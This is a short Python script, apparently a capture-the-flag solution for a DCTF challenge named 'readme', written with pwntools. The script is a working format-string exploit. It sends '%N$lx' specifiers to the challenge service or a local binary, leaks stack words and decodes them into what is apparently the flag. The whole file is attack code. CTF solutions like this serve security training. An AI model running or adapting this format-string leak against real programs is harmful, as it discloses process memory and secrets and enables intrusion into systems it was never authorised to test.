#!/usr/bin/env python3
import pwn

host = "dctf-chall-readme.westeurope.azurecontainer.io"
port = 7481
target = "readme"


def exploit(remote):
    if remote:
        pr = pwn.connect(host, port)
    else:
        pr = pwn.process(target)

    try:
        payload = ''
        for i in range(11, 7, -1):
            payload += "%{}$lx".format(i)

        pr.sendafter("name?\n", payload)
        pr.sendline()
        s = pr.readall(2).decode().strip()
        s = s[s.find(' ')+1:]
        print(s)
        print(''.join(reversed(''.join([chr(int(s[i:i+2],16)) for i in range(0, len(s), 2)]))))
    except Exception as e:
        print(e)
    finally:
        pr.close()

exploit(True)
